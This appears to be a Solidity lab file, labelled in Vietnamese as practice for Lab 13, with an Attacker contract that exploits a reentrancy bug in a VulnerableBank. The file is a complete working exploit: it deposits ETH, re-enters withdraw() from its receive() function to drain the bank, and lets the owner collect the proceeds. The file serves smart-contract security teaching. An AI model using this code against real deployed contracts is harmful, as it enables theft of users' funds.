// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker - khai thac loi reentrancy cua VulnerableBank, chi dung de luyen tap (Lab 13)
contract Attacker {
    IVulnerableBank public immutable bank;
    address public owner;

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Can it nhat 1 ETH");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "Khong phai owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Chuyen that bai");
    }
}
